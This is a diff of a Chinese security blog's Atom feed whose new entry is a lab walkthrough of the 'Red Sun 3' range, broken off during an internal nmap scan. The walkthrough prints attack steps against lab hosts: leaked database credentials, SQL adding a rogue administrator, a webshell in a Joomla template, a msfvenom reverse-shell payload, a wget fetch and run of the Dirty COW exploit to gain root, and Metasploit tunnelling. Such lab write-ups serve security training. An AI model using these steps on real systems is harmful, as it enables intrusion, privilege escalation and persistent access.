@@ -1,26 +1,784 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Sec/Win on l1uyun</title>
-    <link>https://l1uyun.one/tags/sec/win/</link>
-    <description>Recent content in Sec/Win on l1uyun</description>
-    <generator>Hugo</generator>
-    <language>zh-CN</language>
-    <lastBuildDate>Sun, 24 Nov 2024 18:41:52 +0800</lastBuildDate>
-    <atom:link href="https://l1uyun.one/tags/sec/win/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>红日靶场3</title>
-      <link>https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA3/</link>
-      <pubDate>Mon, 07 Oct 2024 21:20:16 +0800</pubDate>
-      <guid>https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA3/</guid>
-      <description>&lt;h1 id=&#34;前言&#34;&gt;前言&lt;/h1&gt;&#xA;&lt;p&gt;得加快红日靶场的进度了&lt;/p&gt;&#xA;&lt;h1 id=&#34;红日靶场3&#34;&gt;红日靶场3&lt;/h1&gt;&#xA;&lt;h2 id=&#34;搭建环境&#34;&gt;搭建环境&lt;/h2&gt;&#xA;&lt;p&gt;这个靶场只有一台web服务器暴露在外网中&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;外网网段 192.168.3.1/24&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;攻击机 parrot 192.168.3.101&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;攻击机 wsl  192.168.3.100&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;攻击机 win  192.168.3.99&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;web-centos 192.168.3.3&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;内网网段&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.93.1/24&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;五台靶机都是配置了only-host网卡,除了centos额外有一个nat网卡,来与外网通信.&#xA;启动centos靶机之后,需要&lt;code&gt;service network restart&lt;/code&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;[!INFO]&#xA;配完环境之后,发现忘了弄快照了,可能不会在一个完整的时间内完成,所以&amp;hellip;.重新解压一下,改完网卡后,先弄下快照&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>红日靶场2_win域</title>
-      <link>https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</link>
-      <pubDate>Sat, 28 Sep 2024 11:10:12 +0800</pubDate>
-      <guid>https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</guid>
-      <description>&lt;h1 id=&#34;前言&#34;&gt;前言&lt;/h1&gt;&#xA;&lt;p&gt;环境和红日1的环境搭建差不多，不过这次给三台机器分别是域控、web服务器、个人PC机，与红日1不同的是这里将域管换成了个人PC机，因此我们的一些操作也会有所不同&lt;/p&gt;&#xA;&lt;h1 id=&#34;红日靶场2_win域&#34;&gt;红日靶场2_win域&lt;/h1&gt;&#xA;&lt;h2 id=&#34;搭建环境&#34;&gt;搭建环境&lt;/h2&gt;&#xA;&lt;p&gt;&lt;img loading=&#39;lazy&#39; decoding=&#34;async&#34; src=&#34;https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_1.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;administrator&#xA;1qaz@WSX&#xA;默认密码都是1qaz@WSX&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里需要模拟内网环境,所以需要弄一个内网网卡&lt;/p&gt;&#xA;&lt;p&gt;创建一个vmnet2&#xA;&lt;img loading=&#39;lazy&#39; decoding=&#34;async&#34; src=&#34;https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_2.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后把三台机器的网卡2都改成这个vmnet2就行了&#xA;&lt;img loading=&#39;lazy&#39; decoding=&#34;async&#34; src=&#34;https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_3.png&#34; alt=&#34;&#34;  /&gt;&#xA;DC机器不需要做什么处理,改完网卡直接启动就行&lt;/p&gt;</description>
-    </item>
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
+    <generator uri="https://gohugo.io/" version="0.146.3">Hugo</generator><title type="html"><![CDATA[l1uyun]]></title>
+    
+    
+    
+            <link href="https://l1uyun.one/tags/sec/win/" rel="alternate" type="text/html" title="html" />
+            <link href="https://l1uyun.one/tags/sec/win/index.xml" rel="alternate" type="application/rss+xml" title="rss" />
+    <updated>2025-04-14T09:09:47+00:00</updated>
+    
+    
+    
+    
+        <id>https://l1uyun.one/tags/sec/win/</id>
+    
+        
+        <entry>
+            <title type="html"><![CDATA[红日靶场3]]></title>
+            <link href="https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA3/" rel="alternate" type="text/html" />
+            
+                <id>https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA3/</id>
+            
+            
+            <published>2024-10-07T21:20:16+08:00</published>
+            <updated>2024-10-09T14:36:06+08:00</updated>
+            
+            
+            <content type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p>得加快红日靶场的进度了</p>
+<h1 id="红日靶场3">红日靶场3</h1>
+<h2 id="搭建环境">搭建环境</h2>
+<p>这个靶场只有一台web服务器暴露在外网中</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>外网网段 192.168.3.1/24
+</span></span><span style="display:flex;"><span>攻击机 parrot 192.168.3.101
+</span></span><span style="display:flex;"><span>攻击机 wsl  192.168.3.100
+</span></span><span style="display:flex;"><span>攻击机 win  192.168.3.99
+</span></span><span style="display:flex;"><span>web-centos 192.168.3.3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>内网网段
+</span></span><span style="display:flex;"><span>192.168.93.1/24
+</span></span></code></pre></div><p>五台靶机都是配置了only-host网卡,除了centos额外有一个nat网卡,来与外网通信.
+启动centos靶机之后,需要<code>service network restart</code></p>
+<blockquote>
+<p>[!INFO]
+配完环境之后,发现忘了弄快照了,可能不会在一个完整的时间内完成,所以&hellip;.重新解压一下,改完网卡后,先弄下快照</p></blockquote>
+<h2 id="外网">外网</h2>
+<p>访问192.168.3.3</p>
+<h3 id="信息收集">信息收集</h3>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_1.png" alt=""  />
+joomla cms
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_2.png" alt=""  />
+这个cms之前打靶机的时候遇见过
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_3.png" alt=""  />
+在README.txt中发现了版本信息(在http://192.168.3.3/administrator/manifests/files/joomla.xml中也有)
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_4.png" alt=""  />
+在exploit-db中查找一下,先看看两个sql注入,RealEstateManager和VehicleManager组件的,但是这台机器,这两个组件都没有</p>
+<p>后台弱口令登录失败,跑一下爆破脚本</p>
+<p>继续找一下nday,尝试了一下,没啥进展</p>
+<h3 id="数据库凭据泄露">数据库凭据泄露</h3>
+<p>回到目录扫描
+御剑扫一下
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_5.png" alt=""  />
+phpinfo
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_6.png" alt=""  />
+电脑卡起来了,御剑崩了,换成dirsearch,扫到了下面这个文件
+<code>http://192.168.3.3/configuration.php~</code>
+里面有数据库的账号密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>	public $dbtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mysqli&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;testuser&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;cvcvgjASD!@&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $db <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;joomla&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $dbprefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;am2zu_&#39;</span>;
+</span></span></code></pre></div><p>navicat连一下
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_7.png" alt=""  /></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>admin
+</span></span><span style="display:flex;"><span>$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>administrator
+</span></span><span style="display:flex;"><span>$2y$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2
+</span></span></code></pre></div><p>bcrypt加密</p>
+<h3 id="sql添加管理员">sql添加管理员</h3>
+<p>没跑出来,<a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn" target="_blank" rel="noopener nofollow noreferrer" >添加一个新用户算了</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>am2zu_users<span style="color:#f92672">`</span>
+</span></span><span style="display:flex;"><span>   (<span style="color:#f92672">`</span>name<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>username<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>password<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>params<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>registerDate<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>lastvisitDate<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>lastResetTime<span style="color:#f92672">`</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;Administrator2&#39;</span>, <span style="color:#e6db74">&#39;admin2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, NOW(), NOW(), NOW());
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>am2zu_user_usergroup_map<span style="color:#f92672">`</span> (<span style="color:#f92672">`</span>user_id<span style="color:#f92672">`</span>,<span style="color:#f92672">`</span>group_id<span style="color:#f92672">`</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">VALUES</span> (LAST_INSERT_ID(),<span style="color:#e6db74">&#39;8&#39;</span>);
+</span></span></code></pre></div><p>然后使用admin2:secret登录进入后台
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_8.png" alt=""  /></p>
+<h3 id="后台模板getshell">后台模板getshell</h3>
+<p>上传webshell,这里生成的是蚁剑的
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_9.png" alt="|500"  />
+修改error.php,并保存
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_10.png" alt=""  />
+路径是<code>http://192.168.3.3/templates/beez3/error.php</code></p>
+<h3 id="antsword">antsword</h3>
+<p>连上去了
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_11.png" alt=""  />
+加载插件之后执行命令
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_12.png" alt=""  />
+存在内网ip 192.168.93.120</p>
+<p>传到msf里面吧</p>
+<pre tabindex="0"><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.100 LPORT=4444 -f elf -o shell.elf
+</code></pre><p>没传成功&hellip;.尝试了很多反弹shell的操作,但是都没有弹成功
+最后在tmp目录下发现了凭据,前期已经知道了ssh是开放的,连上去</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -o HostKeyAlgorithms<span style="color:#f92672">=</span>+ssh-rsa -o PubkeyAcceptedAlgorithms<span style="color:#f92672">=</span>+ssh-rsa wwwuser@192.168.3.3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wwwuser_123Aqx
+</span></span></code></pre></div><p>ssh连上去之后上linpeas脚本,看到了这个nginx配置文件,明白是什么意思了,我拿到的webshell是在内网的192.168.93.120机器上面,而我现在的靶机的内网ip是192.168.93.100,所以我反弹不了web机器的shell回来,有公网ip的这台nginx机器是反向代理了内网的web机器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-rw-r--r--. <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1032</span> Oct  <span style="color:#ae81ff">6</span> 20:09 /etc/nginx/nginx.conf
+</span></span><span style="display:flex;"><span>user  nginx;
+</span></span><span style="display:flex;"><span>worker_processes  1;
+</span></span><span style="display:flex;"><span>error_log  /var/log/nginx/error.log warn;
+</span></span><span style="display:flex;"><span>pid        /var/run/nginx.pid;
+</span></span><span style="display:flex;"><span>events <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    worker_connections  1024;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>http <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  server <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        listen  80;
+</span></span><span style="display:flex;"><span>        server_name  localhost;
+</span></span><span style="display:flex;"><span>        location / <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>         proxy_pass  http://192.168.93.120;
+</span></span><span style="display:flex;"><span>              proxy_set_header        Host $host;
+</span></span><span style="display:flex;"><span>              proxy_connect_timeout   90;
+</span></span><span style="display:flex;"><span>              proxy_send_timeout      90;
+</span></span><span style="display:flex;"><span>              proxy_read_timeout      90;
+</span></span><span style="display:flex;"><span>              proxy_buffer_size       4k;
+</span></span><span style="display:flex;"><span>              proxy_buffers           <span style="color:#ae81ff">4</span> 32k;
+</span></span><span style="display:flex;"><span>              proxy_busy_buffers_size 64k;
+</span></span><span style="display:flex;"><span>              proxy_temp_file_write_size 64k;
+</span></span><span style="display:flex;"><span>              proxy_redirect          off;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>stream  <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>upstream proxy_name <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    server 192.168.93.120:3306;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>server <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    listen 3306;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    proxy_pass proxy_name;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="提权">提权</h3>
+<p>接下来要对内网的机器进一步渗透,这台公网机器需要作为跳板机,先得拿下root</p>
+<p>尝试一下脏牛
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_13.png" alt=""  /></p>
+<p>上传.c文件,将文件里面的用户名改成root</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ wget 192.168.3.100/dirty.c
+</span></span><span style="display:flex;"><span>--2019-10-06 22:57:45--  http://192.168.3.100/dirty.c
+</span></span><span style="display:flex;"><span>Connecting to 192.168.3.100:80... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">4807</span> <span style="color:#f92672">(</span>4.7K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/x-csrc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: “dirty.c”
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>100%<span style="color:#f92672">[================================================</span>&gt;<span style="color:#f92672">]</span> 4,807       --.-K/s   in 0s      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2019-10-06 22:57:45 <span style="color:#f92672">(</span>11.1 MB/s<span style="color:#f92672">)</span> - “dirty.c” saved <span style="color:#f92672">[</span>4807/4807<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ gcc -pthread dirty.c -o dirty -lcrypt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ ls -al ./dirty
+</span></span><span style="display:flex;"><span>-rwxrwxr-x. <span style="color:#ae81ff">1</span> wwwuser wwwuser <span style="color:#ae81ff">12056</span> Oct  <span style="color:#ae81ff">6</span> 22:57 ./dirty
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ ./dirty 
+</span></span><span style="display:flex;"><span>/etc/passwd successfully backed up to /tmp/passwd.bak
+</span></span><span style="display:flex;"><span>Please enter the new password: 
+</span></span><span style="display:flex;"><span>Complete line:
+</span></span><span style="display:flex;"><span>root:roNJMEIcMPy4.:0:0:pwned:/root:/bin/bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mmap: 7f6fb884c000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ su root
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost tmp<span style="color:#f92672">]</span><span style="color:#75715e"># id</span>
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+</span></span></code></pre></div><p>拿下root,将shell传到msf中,<a href="https://www.revshells.com" target="_blank" rel="noopener nofollow noreferrer" >msfvenom</a>
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_14.png" alt=""  /></p>
+<h3 id="搭建socks隧道">搭建socks隧道</h3>
+<p>参考之前在红日1里面的笔记<a href="%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f.md###%e6%90%ad%e5%bb%basocks%e9%9a%a7%e9%81%93">红日靶场1-win域</a></p>
+<pre tabindex="0"><code>run post/multi/manage/autoroute
+background
+use auxiliary/server/socks_proxy
+run
+使用jobs即可查看
+msf6 auxiliary(server/socks_proxy) &gt; jobs
+
+Jobs
+====
+
+  Id  Name                           Payload  Payload opts
+  --  ----                           -------  ------------
+  0   Auxiliary: server/socks_proxy
+</code></pre><h2 id="内网">内网</h2>
+<h3 id="内网存活探测">内网存活探测</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4 nmap -sn -PE 192.168.93.1/24
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains.conf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/local/lib/libproxychains4.so
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-08 17:05 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.1
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0016s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.10
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0018s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.20
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0033s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.30
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0015s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.100
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0017s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.120
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0050s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">256</span> IP addresses <span style="color:#f92672">(</span><span style="color:#ae81ff">6</span> hosts up<span style="color:#f92672">)</span> scanned in 1.56 seconds
+</span></span></code></pre></div><h3 id="内网web机器">内网web机器</h3>
+<p>扫一下那台内网web机器,9191端口应该是我刚刚用蚁剑的后渗透插件启动的bind-shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4 nmap -Pn -sT 192.168.93.120 -p22,80,3306,9191 --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains.conf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/local/lib/libproxychains4.so
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-08 17:12 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.120
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.031s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE  SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open   ssh
+</span></span><span style="display:flex;"><span>80/tcp   open   http
+</span></span><span style="display:flex;"><span>3306/tcp open   mysql
+</span></span><span style="display:flex;"><span>9191/tcp closed sun-as-jpda
+</span></span></code></pre></div><p>现在再回到蚁剑的后渗透模块,设置代理,使用bind-shell,传回msf
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_15.png" alt=""  />
+linux的两台机器拿到了
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_16.png" alt=""  />
+还剩下三台win机器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.93.10
+</span></span><span style="display:flex;"><span>192.168.93.20
+</span></span><span style="display:flex;"><span>192.168.93.30
+</span></span></code></pre></div><h3 id="信息收集-1">信息收集</h3>
+<p>这里我配完proxifier之后,在浏览器里面访问了一下,发现20机器的80端口开放,先扫一下这台</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>复习一下awk,提取nmap的扫描结果中的端口号
+</span></span><span style="display:flex;"><span>awk -F <span style="color:#e6db74">&#39;/&#39;</span>  -v ORS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#e6db74">&#39;{print $1}&#39;</span> aaa | sed <span style="color:#e6db74">&#39;s/,$//&#39;</span>
+</span></span></code></pre></div><p>win2008</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4 nmap -Pn -sT 192.168.93.20 -p80,135,139,445,1433,2383,47001,49152,49153,49154,49155,49156,49158  -A  --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains.conf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-08 18:56 CST
